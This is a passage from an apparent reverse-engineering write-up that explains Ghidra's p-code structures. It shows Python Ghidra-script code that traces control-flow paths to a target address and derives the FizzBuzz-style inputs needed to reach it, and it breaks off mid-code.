fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>s, which are the higher-level representations, which eventually get turned into the decompiled code that you can view. <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeOpAST.html" target="_blank" rel="noopener noreferrer">PCodeOpAST<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> basically come in this form:</p> <div class="language- extra-class"><pre class="language-text"><code>INSTRUCTION &lt;varnode1&gt; &lt;varnode2&gt; &lt;varnode3&gt; ...
</code></pre></div><p>e.g.</p> <div class="language- extra-class"><pre class="language-text"><code>CALL (0, reg, 0x10)
</code></pre></div><p>The full list of such instructions are in <a href="https://ghidra.re/courses/languages/html/pcoderef.html" target="_blank" rel="noopener noreferrer">here<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, along with the inputs they take.</p> <h3 id="pcodeblock"><a href="#pcodeblock" class="header-anchor">#</a> PCodeBlock</h3> <p>Many of these instructions become a <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeBlockBasic.html" target="_blank" rel="noopener noreferrer">PCodeBlock<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, which are basically the smallest unit of contiguous code without branches. Similar to a block of code, we have:</p> <div class="language-asm extra-class"><pre class="language-text"><code>mov eax, 1
call FUN_454542
sub rdi, rsi, 8
jl LAB_045666
</code></pre></div><p>But instead of a block of assembly instructions, we have a block of <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeOpAST.html" target="_blank" rel="noopener noreferrer">PCodeOpAST<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>s. e.g.</p> <div class="language- extra-class"><pre class="language-text"><code>MOVE     (4, reg, 1), (4, const, 1)
CALL     FUN_454542
INT_SUB  (4, reg, 2), (4, reg, 3), (4, const, 8)
CBRANCH  LAB_045666
</code></pre></div><p><a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeBlockBasic.html" target="_blank" rel="noopener noreferrer">PCodeBlock<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> usually come in the form of <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeBlockBasic.html#" target="_blank" rel="noopener noreferrer">PCodeBlockBasic<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>s, but the difference is minor.</p> <h3 id="varnode"><a href="#varnode" class="header-anchor">#</a> Varnode</h3> <p>I'm sure you have figured it out by now, but a <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/Varnode.html" target="_blank" rel="noopener noreferrer">Varnode<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> is a representation of a memory region e.g. register, stack, global memory, and even constant values.</p> <p>So, what do we do with all of these?</p> <p>With a graph of <code>PCodeBlock</code> of a function, we can run DFS between the start of the function and the block where the <em>reach</em> address is. The resulting path is in fact an inferior method of the output of running <a href="http://www0.cs.ucl.ac.uk/staff/M.Harman/exe1.html" target="_blank" rel="noopener noreferrer">Backward Slicing<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, but works since our functions are simplistic. With the resulting path, we iterate through all the <code>PcodeOpAST</code>s to build up a list of <code>ExitFast(fn)</code> and <code>FizzBuzz(max, conditions)</code>. We will have to have some sort of memory manager (just a good ol' <code>dict</code> for me) that will have to keep track of the <code>Varnode</code>s. Finally, we have to do these steps again to replace the <code>ExitFast(fn)</code> with the equivalent list of <code>FizzBuzz(max, conditions)</code></p> <p>Let's get the definitions out of the way:</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">Input</span><span class="token punctuation">:</span> <span class="token comment"># just a marker class</span>
  <span class="token keyword">pass</span>


<span class="token keyword">class</span> <span class="token class-name">FizzBuzz</span><span class="token punctuation">(</span>Input<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>actual <span class="token operator">=</span> n
        self<span class="token punctuation">.</span>conditions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment"># array of Equals</span>

    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&quot;FizzBuzz(%d, %s)&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>actual<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>conditions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">flip_last_condition</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>conditions<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flip<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">add_condition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cond<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>conditions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cond<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">ExitFast</span><span class="token punctuation">(</span>Input<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>fn <span class="token operator">=</span> fn

    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&quot;ExitFast(%s)&quot;</span><span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>fn<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Equals</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> not_<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>not_ <span class="token operator">=</span> not_
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> n

    <span class="token keyword">def</span> <span class="token function">flip</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>not_ <span class="token operator">=</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>not_

    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&quot;%s(%d)&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token string">&quot;NotEquals&quot;</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>not_ <span class="token keyword">else</span> <span class="token string">&quot;Equals&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
</code></pre></div><p>The idea is that we build up a list of <code>Input</code> (<code>ExitFast</code> / <code>FizzBuzz</code>) as we go. We can constrain the values of the correct input to provide to a call to <code>fizzbuzz</code> by adding
to the <code>conditions</code> of <code>FizzBuzz</code> as we encounter conditional branches (we add <code>Equal(not_ = true|false, n)</code>). Here's how we iterate though the <code>PCodeOpAST</code>s:</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Find path from start to end, in terms of a list of PCodeBlock

    :param start: Start block, the first block of the function
    :param end: Target block
    :return: PCodeBlock[] that represents the path between the start and end block
    &quot;&quot;&quot;</span>
    explored <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    neighs <span class="token operator">=</span> <span class="token keyword">lambda</span> b<span class="token punctuation">:</span> <span class="token punctuation">[</span>b<span class="token punctuation">.</span>getOut<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>outSize<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># get blocks coming out of `b`</span>

    <span class="token keyword">def</span> <span class="token function">_inner</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> cur <span class="token keyword">in</span> explored<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token keyword">if</span> cur <span class="token operator">==</span> end<span class="token punctuation">:</span>
            <span class="token keyword">return</span> path <span class="token operator">+</span> <span class="token punctuation">[</span>cur<span class="token punctuation">]</span>
        explored<span class="token punctuation">.</span>add<span class="token punctuation">(</span>cur<span class="token punctuation">)</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> neighs<span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> _inner<span class="token punctuation">(</span>x<span class="token punctuation">,</span> path <span class="token operator">+</span> <span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> p <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> p
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">return</span> _inner<span class="token punctuation">(</span>start<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">find_target</span><span class="token punctuation">(</span>blocks<span class="token punctuation">,</span> reach<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Find the PCodeBlock, PCodeOpAST that the address `reach` belongs to
    :param blocks: The list of blocks to check
    :param reach: The target address
    :return: (PCodeBlock, PCodeOpAST)
    &quot;&quot;&quot;</span>
    <span class="token keyword">for</span> block <span class="token keyword">in</span> blocks<span class="token punctuation">:</span>
        <span class="token keyword">for</span> op <span class="token keyword">in</span> block<span class="token punctuation">.</span>iterator<span class="token punctuation">:</span>
            <span class="token comment"># op.seqnum.target.offset is the address of the PCodeOpAST</span>
            <span class="token comment"># note that this is sort-of undocumented and might not be</span>
            <span class="token comment"># the same in future versions of Ghidra</span>
            <span class="token keyword">if</span> op<span class="token punctuation">.</span>seqnum<span class="token punctuation">.</span>target<span class="token punctuation">.</span>offset <span class="token operator">==</span> reach<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token punctuation">(</span>block<span class="token punctuation">,</span> op<span class="token punctuation">)</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;No path found&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> reach<span class="token punctuation">,</span> blocks<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Build up a list of Input objects (FizzBuzz(max, conditions) and ExitFast) from
    the list of `PCodeBlock`s (which have an iterator to `PCodeOpAST`s).

    :param start: PCodeBlock, the first block in the function
    :param reach: int, The target address
    :param blocks: PCodeBlock[], all the blocks in the function
    :return: list of Input objects
    &quot;&quot;&quot;</span>
    <span class="token comment"># find which PCodeOpAST and PCodeBlock that `reach` belongs so</span>
    target_block<span class="token punctuation">,</span> target_op <span class="token operator">=</span> find_target<span class="token punctuation">(</span>blocks<span class="token punctuation">,</span> reach<span class="token punctuation">)</span>
    <span class="token comment"># find path between start</span>
    path <span class="token operator">=</span> dfs<span class="token punctuation">(</span>start<span class="token punctuation">,</span> target_block<span class="token punctuation">)</span>
    <span class="token comment"># Varnode storage, meant to map Varnode =&gt; FizzBuzz</span>
    mem <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token comment"># List of ExitFast and FizzBuzz that we have to satsisfy for this function</span>
    inps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        block <span class="token operator">=</span> path<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

        <span class="token keyword">for</span> op <span class="token keyword">in</span> block<span class="token punctuation">.</span>iterator<span class="token punctuation">:</span> <span class="token comment"># iterate through each PCodeOpAST in each PCodeBlock in the path</span>
            <span class="token keyword">if</span> op <span class="token operator">==</span> target_op<span class="token punctuation">:</span> <span class="token comment"># reached, exit!</span>
                <span class="token keyword">break</span>

            <span class="token keyword">if</span> op<span class="token punctuation">.</span>opcode <span class="token operator">==</span> op<span class="token punctuation">.</span>CALL<span class="token punctuation">:</span> <span class="token comment"># if this is a CALL</span>
                <span class="token comment"># op.inputs[0] is the address of the function we are calling, as a Varnode.</span>
                <span class="token comment"># `.offset` will get it as a constant value</span>
                addr <span class="token operator">=</span> op<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>offset
                <span class="token keyword">if</span> addr <span class="token operator">==</span> fizz_buzz<span class="token punctuation">:</span>
                    <span class="token comment"># op.inputs[1] is the actual Varnode for the first parameter</span>
                    <span class="token builtin">max</span> <span class="token operator">=</span> op<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>offset <span class="token comment"># constant e.g. 4</span>
                    inp <span class="token operator">=</span> FizzBuzz<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">)</span> <span class="token comment"># conditions is initially empty</span>
                    <span class="token comment"># op.output is the Varnode for the return value.</span>
                    <span class="token comment"># Here, we track it in `mem`</span>
                    mem<span class="token punctuation">[</span>op<span class="token punctuation">.</span>output<span class="token punctuation">]</span> <span class="token operator">=</span> inp
                    <span class="token comment"># .. and also add it into the input list</span>
                    inps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>inp<span class="token punctuation">)</span>
                <span class="token keyword">elif</span> addr <span class="token operator">==</span> fgets <span class="token keyword">or</span> addr <span class="token operator">==</span> puts <span class="token keyword">or</span> addr <span class="token operator">==</span> setbuf<span class="token punctuation">:</span>
                    <span class="token keyword">pass</span> <span class="token comment"># ignore</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token comment"># this is a function like FUN_0808431. Exit out of this early</span>
                    inps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ExitFast<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token keyword">elif</span> op<span class="token punctuation">.</span>opcode <span class="token operator">==</span> op<span class="token punctuation">.</span>MULTIEQUAL<span class="token punctuation">:</span>
                <span class="token comment"># represents a `output` that can be _any_ of the values in `input`</span>
                <span class="token comment"># since we do backward slicing, only one of the inputs will be set</span>
                <span class="token keyword">for</span> inp <span class="token keyword">in</span> op<span class="token punctuation">.</span>inputs<span class="token punctuation">:</span>
                    <span class="token keyword">if</span> inp <span class="token keyword">in</span> mem<span class="token punctuation">:</span>
                        mem<span class="token punctuation">[</span>op<span class="token punctuation">.</span>output<span class="token punctuation">]</span> <span class="token operator">=</span> mem<span class="token punctuation">[</span>inp<span class="token punctuation">]</span> <span class="token comment"># forward the value</span>

            <span class="token keyword">elif</span> op<span class="token punctuation">.</span>opcode <span class="token operator">==</span> op<span class="token punctuation">.</span>INT_NOTEQUAL <span class="token keyword">or</span> op<span class="token punctuation">.</span>opcode <span class="token operator">==</span> op<span class="token punctuation">.</span>INT_EQUAL<span class="token punctuation">:</span>
                <span class="token comment"># represents a `c != 3` or `c == 4` operation. We can add conditions to our FizzBuzz here</span>
                <span class="token comment"># to limit how much of the `fizzbuzz` code we should fulfill</span>
                inp <span class="token operator">=</span> mem<span class="token punctuation">[</span>op<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
                <span class="token builtin">cmp</span> <span class="token operator">=</span> op<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>offset
                <span class="token comment"># restrict our FizzBuzz, with the assumption that this condition is true.</span>
                <span class="token comment"># The assumption can be checked in the corresponding CBRANCH</span>
                inp<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>Equals<span class="token punctuation">(</span>op<span class="token punctuation">.</span>opcode <span class="token operator">!=</span> op<span class="token punctuation">.</span>INT_EQUAL<span class="token punctuation">,</span> <span class="token builtin">cmp</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                mem<span class="token punctuation">[</span>op<span class="token punctuation">.</span>output<span class="token punctuation">]</span> <span class="token operator">=</span> inp <span class="token comment"># forward the value into the output of the comparison</span>

            <span class="token keyword">elif</span> op<span class="token punctuation">.</span>opcode <span class="token operator">==</span> op<span class="token punctuation">.</span>CBRANCH<span class="token punctuation">:</span>
                <span class="token comment"># represents branch being taken/not taken. Succeeds a INT_EQUAL or INT_NOTEQUAL,</span>
                <span class="token comment"># and will thus determine if the INT_EQUAL/INT_NOTEQUAL should be true or false</span>

                <span class="token comment"># op.inputs[1] is the Varnode for the value of the comparison</span>
                inp <span class="token operator">=</span> mem<span class="token punctuation">[</span>op<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> block<span class="token punctuation">.</span>trueOut <span class="token operator">!=</span> path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                    <span class="token comment"># if the true branch is not the block,</span>
                    <span class="token comment"># flip the previous comparison</span>
                    inp<span class="token punctuation">.</span>flip_last_condition<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token keyword">elif</span> op<span class="token punctuation">.</span>opcode <span class="token operator">==</span> op<span class="token punctuation">.</span>INDIRECT<span class="token punctuation">:</span>
                <span class="token keyword">pass</span> <span class="token comment"># can ignore</span>

            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token comment"># unknown PCodeOpAST!</span>
                <span class="token keyword">if</span> start<span class="token punctuation">.</span>start<span class="token punctuation">.</span>offset <span class="token operator">==</span> main<span class="token punctuation">:</span>
                    <span class="token keyword">continue</span> <span class="token comment"># but ignore the unknown ones in main, they do nothing anyway</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Unknown &quot;</span> <span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">&quot; in &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> inps

</code></pre></div><p>Now, we have to find a way to get the <code>PCodeBlock</code>s of a function so that we can apply the above methods.
To do that, we have to decompile the functions to get <a href="https://ghidra.re/ghidra_docs/api/ghidra/app/decompiler/DecompileResults.html" target="_blank" rel="noopener noreferrer">DecompileResults<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, which contains the juicy information we need.
Note that since we might have a have a lot of functions to decompile, I opted to speed up the process by using the <a href="https://ghidra.re/ghidra_docs/api/ghidra/app/decompiler/parallel/ParallelDecompiler.html" target="_blank" rel="noopener noreferrer">ParallelDecompiler<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>.</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">Reaches</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> reaches<span class="token punctuation">,</span> check<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>reaches <span class="token operator">=</span> reaches
        self<span class="token punctuation">.</span>mapping <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>reaches<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>funcs <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> getFunctionAt<span class="token punctuation">(</span>toAddr<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>mapping<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>check <span class="token operator">=</span> check
        self<span class="token punctuation">.</span>results <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>decompile<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>results

    <span class="token keyword">def</span> <span class="token function">callback</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;
        Utility function to adapt a DecompileResult to match that of `check`

        :param result: DecompileResult
        &quot;&quot;&quot;</span>
        funcAddr <span class="token operator">=</span> result<span class="token punctuation">.</span>function<span class="token punctuation">.</span>entryPoint<span class="token punctuation">.</span>offset
        reach <span class="token operator">=</span> self<span class="token punctuation">.</span>mapping<span class="token punctuation">[</span>funcAddr<span class="token punctuation">]</span>
        high <span class="token operator">=</span> result<span class="token punctuation">.</span>highFunction
        start_block <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token builtin">iter</span><span class="token punctuation">(</span>high<span class="token punctuation">.</span>basicBlocks<span class="token punctuation">)</span><span class="token punctuation">)</span>
        ret <span class="token operator">=</span> self<span class="token punctuation">.</span>check<span class="token punctuation">(</span>start_block<span class="token punctuation">,</span> reach<span class="token punctuation">,</span> high<span class="token punctuation">.</span>basicBlocks<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>results<span class="token punctuation">[</span>funcAddr<span class="token punctuation">]</span> <span class="token operator">=</span> ret


    <span class="token keyword">def</span> <span class="token function">decompile</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;
        Run ParallelDecompiler to decompile the functions and get their DecompileResult, massively!
        &quot;&quot;&quot;</span>
        <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>function <span class="token keyword">import</span> Consumer
        <span class="token keyword">import</span> ghidra<span class="token punctuation">.</span>app<span class="token punctuation">.</span>decompiler<span class="token punctuation">.</span>parallel<span class="token punctuation">.</span>ParallelDecompiler <span class="token keyword">as</span> ParallelDecompiler
